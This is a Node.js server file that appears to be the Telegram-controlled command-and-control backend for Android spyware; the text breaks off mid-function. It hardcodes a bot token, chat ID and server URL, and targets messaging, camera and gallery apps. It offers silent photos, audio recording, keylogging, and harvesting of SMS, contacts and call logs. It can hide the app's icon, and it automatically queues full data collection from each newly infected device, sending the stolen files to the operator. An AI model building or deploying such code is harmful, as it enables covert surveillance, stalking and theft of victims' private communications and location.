const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// ============= CONFIGURATION =============
// IMPORTANT: For SECONDARY server, MAIN_BOT_TOKEN is empty
// The secondary server uses its OWN bot token
const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || '';
const SECONDARY_BOT_TOKEN = process.env.SECONDARY_BOT_TOKEN || '8606674782:AAHzMQ95OqETq3ZOpz-qor9cISMxQdhf9CE';
const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://core-m0tr.onrender.com';

// Current active configuration - start with secondary
let activeBotToken = SECONDARY_BOT_TOKEN;
let activeServerUrl = SECONDARY_SERVER_URL;

// Persistent storage files
const DEVICES_FILE = path.join(__dirname, 'devices.json');
const AUTO_DATA_FILE = path.join(__dirname, 'autodata.json');

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs - use the SAME chat ID as main server
const authorizedChats = new Set([
    '8266841615',  // Your main Telegram chat ID
]);

// Auto-collection flags
const autoDataRequested = new Map();

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= ENCRYPTION FUNCTIONS =============

// Device-specific encryption (same as Android app)
function encryptForDevice(data, deviceId) {
    try {
        const key = crypto.createHash('sha256').update(deviceId).digest();
        const iv = key.slice(0, 16);
        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
        let encrypted = cipher.update(data, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    } catch (error) {
        console.error('Encryption error:', error);
        return null;
    }
}

// ============= PERSISTENT STORAGE FUNCTIONS =============

function loadDevices() {
    try {
        if (fs.existsSync(DEVICES_FILE)) {
            const data = fs.readFileSync(DEVICES_FILE, 'utf8');
            const savedDevices = JSON.parse(data);
            for (const [id, device] of Object.entries(savedDevices)) {
                devices.set(id, device);
            }
            console.log(`✅ Loaded ${devices.size} devices from persistent storage`);
        } else {
            console.log('📝 No existing devices file found, starting fresh');
        }
    } catch (error) {
        console.error('Error loading devices:', error);
    }
}

function saveDevices() {
    try {
        const devicesObj = {};
        for (const [id, device] of devices.entries()) {
            devicesObj[id] = device;
        }
        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devicesObj, null, 2));
        console.log(`💾 Saved ${devices.size} devices to persistent storage`);
    } catch (error) {
        console.error('Error saving devices:', error);
    }
}

function loadAutoDataFlags() {
    try {
        if (fs.existsSync(AUTO_DATA_FILE)) {
            const data = fs.readFileSync(AUTO_DATA_FILE, 'utf8');
            const savedAutoData = JSON.parse(data);
            for (const [id, flag] of Object.entries(savedAutoData)) {
                autoDataRequested.set(id, flag);
            }
            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags`);
        }
    } catch (error) {
        console.error('Error loading auto-data flags:', error);
    }
}

function saveAutoDataFlags() {
    try {
        const autoDataObj = {};
        for (const [id, flag] of autoDataRequested.entries()) {
            autoDataObj[id] = flag;
        }
        fs.writeFileSync(AUTO_DATA_FILE, JSON.stringify(autoDataObj, null, 2));
    } catch (error) {
        console.error('Error saving auto-data flags:', error);
    }
}

// Load persistent data on startup
loadDevices();
loadAutoDataFlags();

// ============= DEVICE CONFIGURATION =============
const deviceConfigs = {
    'default': {
        chatId: '8266841615',  // Same chat ID as main server
        config: {
            chatId: '8266841615',
            botToken: SECONDARY_BOT_TOKEN,  // Secondary bot token
            serverUrl: SECONDARY_SERVER_URL,
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: false,
            autoRecording: false,
            screenshotQuality: 30,
            recordingQuality: 'VERY LOW',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.sec.android.gallery3d',
                'com.samsung.android.messaging',
                'com.android.chrome',
                'com.google.android.youtube',
                'com.google.android.apps.camera',
                'com.sec.android.app.camera',
                'com.android.camera',
                'com.whatsapp',
                'com.instagram.android',
                'com.facebook.katana',
                'com.snapchat.android',
                'com.google.android.apps.maps',
                'com.google.android.apps.messaging',
                'com.microsoft.teams',
                'com.zoom.us',
                'com.discord',
                'com.mediatek.camera',
                'com.whatsapp.w4b',
                'com.pri.filemanager',
                'com.android.dialer',
                'com.facebook.orca',
                'com.google.android.apps.photosgo',
                'com.tencent.mm',
                'com.google.android.apps.photos',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true,
                sms: true,
                callLogs: true,
                location: true,
                screenshots: true,
                recordings: true,
                keystrokes: true,
                notifications: true,
                phoneInfo: true,
                wifiInfo: true,
                mobileInfo: true,
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024,
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// Get current active Telegram API URL
function getTelegramApiUrl() {
    return `https://api.telegram.org/bot${activeBotToken}`;
}

// ============= DEVICE MANAGEMENT FUNCTIONS =============

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{
            text: `${status}${device.name} (${lastSeen})`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    
    return keyboard;
}

// ==================== MAIN MENU ====================

function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
    }

    return [
        [{ text: '📸 Screenshot', callback_data: 'menu_screenshot' }, { text: '📷 Camera', callback_data: 'menu_camera' }],
        [{ text: '🎤 Recording', callback_data: 'menu_recording' }, { text: '📍 Location', callback_data: 'cmd:location' }],
        [{ text: '📊 Data', callback_data: 'menu_data' }, { text: '⚡ Real-time', callback_data: 'menu_realtime' }],
        [{ text: 'ℹ️ Info', callback_data: 'menu_info' }, { text: '⚙️ System', callback_data: 'menu_system' }],
        [{ text: deviceStatus, callback_data: 'menu_devices' }, { text: '❌ Close', callback_data: 'close_menu' }]
    ];
}

// ==================== SCREENSHOT MENU ====================

function getScreenshotMenuKeyboard() {
    return [
        [{ text: '📸 Take Screenshot', callback_data: 'cmd:screenshot' }, { text: '▶️ Start Service', callback_data: 'cmd:start_screenshot' }],
        [{ text: '⏹️ Stop Service', callback_data: 'cmd:stop_screenshot' }, { text: '🔄 Restart', callback_data: 'cmd:restart_screenshot' }],
        [{ text: '⚙️ Settings', callback_data: 'menu_screenshot_settings' }, { text: '🎯 Target Apps', callback_data: 'menu_screenshot_targets' }],
        [{ text: '🎨 Quality', callback_data: 'menu_screenshot_quality' }, { text: '🔑 Token', callback_data: 'menu_screenshot_token' }],
        [{ text: '🔧 Check Accessibility', callback_data: 'cmd:check_accessibility' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getScreenshotSettingsKeyboard() {
    return [
        [{ text: '📊 Status', callback_data: 'cmd:screenshot_status' }, { text: '⚙️ Config', callback_data: 'menu_sched_config' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getScreenshotTargetsKeyboard() {
    return [
        [{ text: '➕ Add Target', callback_data: 'menu_add_target' }, { text: '❌ Remove Target', callback_data: 'menu_remove_target' }],
        [{ text: '📱 List Targets', callback_data: 'cmd:target_apps' }, { text: '📋 Default Targets', callback_data: 'cmd:default_targets' }],
        [{ text: '🔄 Reset Targets', callback_data: 'cmd:reset_targets' }, { text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getScreenshotQualityKeyboard() {
    return [
        [{ text: '📏 Small (640x480, 60%)', callback_data: 'cmd:small' }],
        [{ text: '📏 Medium (1280x720, 70%)', callback_data: 'cmd:medium' }],
        [{ text: '📏 Original (Full res, 85%)', callback_data: 'cmd:original' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getScreenshotTokenKeyboard() {
    return [
        [{ text: '🔄 Refresh Token', callback_data: 'cmd:refresh_token' }, { text: '🔑 Token Status', callback_data: 'cmd:token_status' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot' }]
    ];
}

function getSchedConfigKeyboard() {
    return [
        [{ text: '📅 Configure Schedule', callback_data: 'menu_configure_schedule' }],
        [{ text: '◀️ Back', callback_data: 'menu_screenshot_settings' }]
    ];
}

// ==================== CAMERA MENU ====================

function getCameraMenuKeyboard() {
    return [
        [{ text: '📸 Take Photo', callback_data: 'cmd:photo' }, { text: '🔇 Silent Photo', callback_data: 'cmd:photo_silent' }],
        [{ text: '👤 Front Camera', callback_data: 'cmd:camera_front' }, { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }],
        [{ text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }, { text: '👤 Front Silent', callback_data: 'cmd:photo_front' }],
        [{ text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

// ==================== RECORDING MENU ====================

function getRecordingMenuKeyboard() {
    return [
        [{ text: '🎤 Start 60s', callback_data: 'cmd:start_60s_rec' }, { text: '⏹️ Stop', callback_data: 'cmd:stop_60s_rec' }],
        [{ text: '⚙️ Settings', callback_data: 'menu_recording_settings' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getRecordingSettingsKeyboard() {
    return [
        [{ text: '📊 Info', callback_data: 'cmd:record_info' }, { text: '✅ Enable Schedule', callback_data: 'cmd:record_on' }],
        [{ text: '❌ Disable Schedule', callback_data: 'cmd:record_off' }, { text: '⚙️ Custom Schedule', callback_data: 'menu_custom_schedule' }],
        [{ text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }, { text: '◀️ Back', callback_data: 'menu_recording' }]
    ];
}

function getAudioQualityKeyboard() {
    return [
        [{ text: '🎤 Ultra Low', callback_data: 'cmd:audio_ultra' }, { text: '🎤 Very Low', callback_data: 'cmd:audio_very_low' }],
        [{ text: '🎤 Low', callback_data: 'cmd:audio_low' }, { text: '🎤 Medium', callback_data: 'cmd:audio_medium' }],
        [{ text: '🎤 High', callback_data: 'cmd:audio_high' }, { text: '◀️ Back', callback_data: 'menu_recording_settings' }]
    ];
}

// ==================== DATA MENU ====================

function getDataMenuKeyboard() {
    return [
        [{ text: '📊 NEW Data', callback_data: 'menu_new_data' }, { text: '📊 ALL Data', callback_data: 'menu_all_data' }],
        [{ text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getNewDataKeyboard() {
    return [
        [{ text: '📇 Contacts', callback_data: 'cmd:contacts' }, { text: '💬 SMS', callback_data: 'cmd:sms' }],
        [{ text: '📞 Call Logs', callback_data: 'cmd:calllogs' }, { text: '📱 Apps', callback_data: 'cmd:apps_list' }],
        [{ text: '⌨️ Keystrokes', callback_data: 'cmd:keys' }, { text: '🔔 Notifications', callback_data: 'cmd:notify' }],
        [{ text: '📱 App Opens', callback_data: 'cmd:open_app' }, { text: '💬 WhatsApp', callback_data: 'cmd:whatsapp' }],
        [{ text: '💬 Telegram', callback_data: 'cmd:telegram' }, { text: '💬 Facebook', callback_data: 'cmd:facebook' }],
        [{ text: '🌐 Browser', callback_data: 'cmd:browser' }, { text: '◀️ Back', callback_data: 'menu_data' }]
    ];
}

function getAllDataKeyboard() {
    return [
        [{ text: '📇 ALL Contacts', callback_data: 'cmd:contacts_all' }, { text: '💬 ALL SMS', callback_data: 'cmd:sms_all' }],
        [{ text: '📞 ALL Call Logs', callback_data: 'cmd:calllogs_all' }, { text: '📱 ALL Apps', callback_data: 'cmd:apps_all' }],
        [{ text: '⌨️ ALL Keystrokes', callback_data: 'cmd:keys_all' }, { text: '🔔 ALL Notifications', callback_data: 'cmd:notify_all' }],
        [{ text: '💬 ALL WhatsApp', callback_data: 'cmd:whatsapp_all' }, { text: '💬 ALL Telegram', callback_data: 'cmd:telegram_all' }],
        [{ text: '💬 ALL Facebook', callback_data: 'cmd:facebook_all' }, { text: '🌐 ALL Browser', callback_data: 'cmd:browser_all' }],
        [{ text: '📍 Location', callback_data: 'cmd:location' }, { text: '🔍 Find Recorded', callback_data: 'cmd:find_recorded' }],
        [{ text: '◀️ Back', callback_data: 'menu_data' }]
    ];
}

function getSyncHarvestKeyboard() {
    return [
        [{ text: '🔄 Sync All', callback_data: 'cmd:sync_all' }, { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }],
        [{ text: '📊 Stats', callback_data: 'cmd:stats' }, { text: '📊 Logs Count', callback_data: 'cmd:logs_count' }],
        [{ text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' }, { text: '⚙️ Set Sync Interval', callback_data: 'menu_set_sync_interval' }],
        [{ text: '◀️ Back', callback_data: 'menu_data' }]
    ];
}

// ==================== REAL-TIME MENU ====================

function getRealtimeMenuKeyboard() {
    return [
        [{ text: '🔑 Keys ON', callback_data: 'cmd:rt_keys_on' }, { text: '🔑 Keys OFF', callback_data: 'cmd:rt_keys_off' }],
        [{ text: '🔔 Notif ON', callback_data: 'cmd:rt_notif_on' }, { text: '🔔 Notif OFF', callback_data: 'cmd:rt_notif_off' }],
        [{ text: '✅ All ON', callback_data: 'cmd:rt_all_on' }, { text: '❌ All OFF', callback_data: 'cmd:rt_all_off' }],
        [{ text: '📊 Status', callback_data: 'cmd:rt_status' }, { text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

// ==================== INFO MENU ====================

function getInfoMenuKeyboard() {
    return [
        [{ text: '📱 Device Info', callback_data: 'cmd:device_info' }],
        [{ text: '🌐 Network Info', callback_data: 'cmd:network_info' }],
        [{ text: '📱 Mobile Info', callback_data: 'cmd:mobile_info' }],
        [{ text: '🏷️ Device Name', callback_data: 'menu_device_name' }],
        [{ text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getDeviceNameKeyboard() {
    return [
        [{ text: '📱 Show Name', callback_data: 'cmd:device_name' }, { text: '🔄 Reset Name', callback_data: 'cmd:reset_device_name' }],
        [{ text: '◀️ Back', callback_data: 'menu_info' }]
    ];
}

// ==================== SYSTEM MENU ====================

function getSystemMenuKeyboard() {
    return [
        [{ text: '📁 Media', callback_data: 'menu_media' }, { text: '📱 App Management', callback_data: 'menu_app_management' }],
        [{ text: '📡 Data Saving', callback_data: 'menu_data_saving' }, { text: '🤖 Bot Token', callback_data: 'menu_bot_token' }],
        [{ text: '◀️ Back', callback_data: 'help_main' }]
    ];
}

function getMediaMenuKeyboard() {
    return [
        [{ text: '🔍 Find Recorded', callback_data: 'cmd:find_recorded' }, { text: '🗑️ Clear Storage', callback_data: 'cmd:clear_storage' }],
        [{ text: '✅ Enable Media Scan', callback_data: 'cmd:enable_media_scan' }, { text: '❌ Disable Media Scan', callback_data: 'cmd:disable_media_scan' }],
        [{ text: '📊 Scan Status', callback_data: 'cmd:media_scan_status' }, { text: '➕ Add Scan Path', callback_data: 'menu_add_scan_path' }],
        [{ text: '❌ Remove Scan Path', callback_data: 'menu_remove_scan_path' }, { text: '📋 List Paths', callback_data: 'cmd:list_scan_paths' }],
        [{ text: '🗑️ Clear Paths', callback_data: 'cmd:clear_scan_paths' }, { text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

function getAppManagementKeyboard() {
    return [
        [{ text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' }, { text: '👻 Hide Icon', callback_data: 'cmd:hide_icon' }],
        [{ text: '👁️ Show Icon', callback_data: 'cmd:show_icon' }, { text: '📁 Browse Files', callback_data: 'cmd:browse_files' }],
        [{ text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

function getDataSavingKeyboard() {
    return [
        [{ text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' }, { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }],
        [{ text: '📊 Saving Status', callback_data: 'cmd:saving_status' }, { text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

function getBotTokenKeyboard() {
    return [
        [{ text: '🤖 Backup Status', callback_data: 'cmd:backup_status' }, { text: '🔄 Set Server Backup', callback_data: 'menu_set_server_backup' }],
        [{ text: '🔄 Force Register', callback_data: 'cmd:force_register_complete' }, { text: '◀️ Back', callback_data: 'menu_system' }]
    ];
}

// ==================== INPUT PROMPT MENUS ====================

function getAddTargetKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]];
}

function getRemoveTargetKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_targets' }]];
}

function getAddScanPathKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]];
}

function getRemoveScanPathKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_media' }]];
}

function getConfigureScheduleKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_screenshot_settings' }]];
}

function getCustomScheduleKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_recording_settings' }]];
}

function getSetSyncIntervalKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_sync_harvest' }]];
}

function getSetServerBackupKeyboard() {
    return [[{ text: '◀️ Cancel', callback_data: 'menu_bot_token' }]];
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${getTelegramApiUrl()}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${getTelegramApiUrl()}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${getTelegramApiUrl()}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        const commands = [
            { command: 'help', description: '📋 Complete help menu' },
            { command: 'showmenu', description: '📋 Show help menu' },
            { command: 'devices', description: '📱 List all devices' },
            { command: 'select', description: '🎯 Select device to control' },
            { command: 'screenshot', description: '📸 Take screenshot' },
            { command: 'record', description: '🎤 Start recording' },
            { command: 'location', description: '📍 Get location' },
            { command: 'sync_all', description: '🔄 Sync all data' }
        ];
        
        await axios.post(`${getTelegramApiUrl()}/setMyCommands`, { commands });
        
        await axios.post(`${getTelegramApiUrl()}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and ${commands.length} commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${getTelegramApiUrl()}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= FORMATTER FUNCTIONS =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return { text: locationData };
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

// ============= AUTO DATA COLLECTION =============

function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
        return;
    }
    
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'device_info',
            'network_info',
            'mobile_info',
            'contacts',
            'sms',
            'calllogs',
            'apps_list',
            'keys',
            'notify',
            'whatsapp',
            'telegram',
            'facebook',
            'browser',
            'location'
        ]
    });
    saveAutoDataFlags();
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commands = [
        { command: 'device_info', delay: 0, description: 'Device Info' },
        { command: 'network_info', delay: 5, description: 'Network Info' },
        { command: 'mobile_info', delay: 10, description: 'Mobile Info' },
        { command: 'contacts', delay: 15, description: 'Contacts' },
        { command: 'sms', delay: 20, description: 'SMS' },
        { command: 'calllogs', delay: 25, description: 'Call Logs' },
        { command: 'apps_list', delay: 30, description: 'Apps' },
        { command: 'keys', delay: 35, description: 'Keystrokes' },
        { command: 'notify', delay: 40, description: 'Notifications' },
        { command: 'whatsapp', delay: 45, description: 'WhatsApp' },
        { command: 'telegram', delay: 50, description: 'Telegram' },
        { command: 'facebook', delay: 55, description: 'Facebook' },
        { command: 'browser', delay: 60, description: 'Browser History' },
        { command: 'location', delay: 65, description: 'Location' }
    ];
    
    commands.forEach((cmd) => {
        const commandObject = {
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000),
            autoData: true
        };
        
        device.pendingCommands.push(commandObject);
        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
    });
    
    console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
    saveDevices();
}

// ============= CRITICAL: COMPLETE CONFIG ENDPOINT =============

app.get('/api/device/:deviceId/complete-config', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`🔐 Complete config requested for device: ${deviceId}`);
    
    // Don't require device to exist for first-time registration
    // Just return the server's own config
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    // Encrypt the bot token and chat ID for this specific device
    const encryptedToken = encryptForDevice(activeBotToken, deviceId);
    const encryptedChatId = encryptForDevice(deviceConfig.chatId, deviceId);
    
    const response = {
        encrypted_token: encryptedToken,
        encrypted_chat_id: encryptedChatId,
        server_url: activeServerUrl,
        timestamp: Date.now()
    };
    
    console.log(`✅ Complete config sent to ${deviceId}`);
    console.log(`   Server URL: ${activeServerUrl}`);
    
    res.json(response);
});

// ============= PHOTO UPLOAD ENDPOINT =============

app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            console.error('❌ Missing fields in photo upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
        formData.append('caption', fullCaption);
        
        await axios.post(`${getTelegramApiUrl()}/sendPhoto`, formData, {
            headers: { ...formData.getHeaders() },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted photo: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting photo:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename: req.file.filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= DATA UPLOAD ENDPOINTS =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 *${deviceName}*\n\n`;
        
        switch (command) {
            case 'contacts':
                caption += `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms':
                caption += `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs':
                caption += `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps_list':
                caption += `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keys':
                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notify':
